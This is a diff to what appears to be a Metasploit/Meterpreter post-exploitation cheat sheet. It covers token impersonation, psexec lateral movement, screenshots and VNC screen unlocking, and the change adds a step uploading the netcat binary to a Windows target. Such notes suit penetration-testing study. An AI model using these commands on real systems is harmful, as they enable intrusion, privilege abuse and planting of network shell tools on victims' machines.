@@ -230,6 +230,12 @@ list_tokens -g
 impersonate_token <domain>\\<user>
 ------------------------------------------------------------------------------------------------------
 
+# Upload tools
+
+upload <local path> <remote path>
+upload /usr/share/windows-binaries/nc.exe c:\\
+------------------------------------------------------------------------------------------------------
+
 # Lateral movement
 
 use windows/smb/psexec
@@ -357,6 +363,3 @@ screenshot                                    Grab a screenshot of the interacti
 run vnc
      if the screen is locked exit VNC
      run screen_unlock
-
-upload <local path> <remote path>
-upload /root/putty.exe c:\\
